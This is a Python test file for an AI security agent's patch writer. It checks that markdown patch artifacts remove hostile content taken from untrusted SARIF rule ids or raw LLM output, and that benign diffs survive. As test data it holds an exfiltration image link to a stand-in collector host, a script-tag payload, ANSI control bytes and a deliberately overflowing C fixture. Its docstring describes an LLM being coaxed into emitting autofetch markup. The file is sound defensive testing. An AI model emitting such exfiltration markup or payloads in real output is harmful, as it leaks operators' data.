"""Output sanitisation of the on-disk patch artifact.

The patch .md interpolates untrusted-SARIF identifiers (rule id, file
path, level) and raw LLM output; a hostile repo's rule id or an LLM
response coaxed into emitting autofetch markup
(``![](https://host/x)``) must not land verbatim in a markdown file
an operator opens — the same exfil vector the validation report
writer already defends against.
"""

from __future__ import annotations

import sys
from pathlib import Path
from types import SimpleNamespace

sys.path.insert(0, str(Path(__file__).resolve().parents[3]))

from packages.llm_analysis.agent import (  # noqa: E402
    AutonomousSecurityAgentV2,
    VulnerabilityContext,
)


class _StubResponse:
    def __init__(self, content: str) -> None:
        self.content = content


class _StubLLM:
    def __init__(self, content: str) -> None:
        self._content = content

    def generate(self, **_kwargs) -> _StubResponse:
        return _StubResponse(self._content)


def _make_vuln(repo: Path, rule_id: str) -> VulnerabilityContext:
    (repo / "vuln.c").write_text(
        "#include <string.h>\nvoid f(char *s){char b[8];strcpy(b,s);}\n"
    )
    vuln = VulnerabilityContext(
        {
            "finding_id": "FIND-0001",
            "rule_id": rule_id,
            "file": "vuln.c",
            "startLine": 2,
            "endLine": 2,
            "message": "strcpy into fixed buffer",
            "level": "error",
        },
        repo,
    )
    vuln.full_code = "strcpy(b,s);"
    vuln.analysis = {"reasoning": "overflow"}
    return vuln


def _stub_agent(out_dir: Path, llm: _StubLLM):
    agent = SimpleNamespace(out_dir=out_dir, llm=llm)
    agent.generate_patch = AutonomousSecurityAgentV2.generate_patch.__get__(
        agent, type(agent),
    )
    agent._load_attack_path = lambda _ref: None
    return agent


def _artifact_text(out_dir: Path) -> str:
    files = list((out_dir / "patches").glob("*_patch.md"))
    assert len(files) == 1
    return files[0].read_text(encoding="utf-8")


class TestPatchArtifactSanitisation:

    def test_llm_autofetch_markup_stripped_from_patch_body(self, tmp_path):
        repo = tmp_path / "repo"
        repo.mkdir()
        out = tmp_path / "out"
        payload = (
            "Here is the fix.\n"
            "![exfil](https://collector.invalid/leak?q=data)\n"
            "```diff\n--- a/vuln.c\n+++ b/vuln.c\n```\n"
        )
        agent = _stub_agent(out, _StubLLM(payload))
        vuln = _make_vuln(repo, "cpp/unbounded-write")

        assert agent.generate_patch(vuln) is True
        text = _artifact_text(out)
        assert "collector.invalid" not in text
        # The patch's own diff fence survives (operator readability +
        # downstream reader contract).
        assert "```diff" in text

    def test_hostile_rule_id_defanged_in_heading(self, tmp_path):
        repo = tmp_path / "repo"
        repo.mkdir()
        out = tmp_path / "out"
        agent = _stub_agent(out, _StubLLM("plain patch text"))
        vuln = _make_vuln(
            repo,
            "rule ![x](https://collector.invalid/y) <script>alert(1)</script>",
        )

        assert agent.generate_patch(vuln) is True
        text = _artifact_text(out)
        assert "collector.invalid" not in text
        assert "<script>" not in text

    def test_control_bytes_escaped(self, tmp_path):
        repo = tmp_path / "repo"
        repo.mkdir()
        out = tmp_path / "out"
        agent = _stub_agent(out, _StubLLM("fix\x1b[31mANSI\x07 here"))
        vuln = _make_vuln(repo, "cpp/unbounded-write")

        assert agent.generate_patch(vuln) is True
        text = _artifact_text(out)
        assert "\x1b" not in text
        assert "\x07" not in text

    def test_benign_patch_survives_intact(self, tmp_path):
        # Two-direction: ordinary patch content is preserved
        # (including diff markers the markdown defang would eat).
        repo = tmp_path / "repo"
        repo.mkdir()
        out = tmp_path / "out"
        body = (
            "```diff\n--- a/vuln.c\n+++ b/vuln.c\n"
            "-strcpy(b,s);\n+strlcpy(b,s,sizeof b);\n```"
        )
        agent = _stub_agent(out, _StubLLM(body))
        vuln = _make_vuln(repo, "cpp/unbounded-write")

        assert agent.generate_patch(vuln) is True
        text = _artifact_text(out)
        assert "-strcpy(b,s);" in text
        assert "+strlcpy(b,s,sizeof b);" in text
        assert "--- a/vuln.c" in text
        assert vuln.patch_code == body
